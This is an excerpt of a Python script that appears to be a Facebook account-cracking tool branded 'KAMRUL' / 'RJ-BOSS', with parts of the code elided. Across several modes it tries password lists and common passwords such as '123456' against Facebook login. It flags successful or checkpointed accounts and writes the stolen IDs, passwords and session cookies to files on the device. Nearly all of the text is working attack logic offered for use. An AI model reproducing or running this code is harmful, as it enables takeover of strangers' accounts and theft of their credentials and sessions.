...
{W}| ' /   / _ \ | |\/| | |_) | | | | |    
{G}| . \  / ___ \| |  | |  _ <| |_| | |___ 
{W}|_|\_\/_/   \_\_|  |_|_| \_\\___/|_____|{G}/{W}RJ-BOSS
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    	...
    	try:
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ...
                    print(f"\r\r{vb}{G}/{W}>{B}KAMRUL-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/GIFT-BY-KAMRUL-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}KAMRUL-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/GIFT-BY-KAMRUL-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	...
    	try:
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ...
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/GIFT-BY-KAMRUL-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}KAMRUL-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/GIFT-BY-KAMRUL-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
...
#-_-_-_-_-_-_-_-<-RANDOM-MENU->-_-_-_-_-_-_-_-#
    def _R_a_N_d_O_m_(self):
    	...
    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
    	print(f"{vb} THANKS FOR RJ BOSD KI TOOL USING.....! ")
    	...
    	try:
            for pas in passlist:
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}KAMRUL-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-KAMRUL-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}KAMRUL-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/GIFT-BY-KAMRUL-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
            ...
            for pas in passlist:
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        ...
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-KAMRUL-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}KAMRUL-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/GIFT-BY-KAMRUL-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    ...
    def _O_l_D_(self,ids):
    	try:
    	    ...
    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
                ...
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    print(f"\r\r{vb}{G}/{W}>{B}KAMRUL-OK{W}< {vcv}{B} {ids}{G} / {B}{pas} \033[1;97m")
                    open('/sdcard/GIFT-BY-KAMRUL-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    print(f"\r\r{vb}{G}/{W}>{Y}KAMRUL-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
                    open('/sdcard/GIFT-BY-KAMRUL-OLD-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
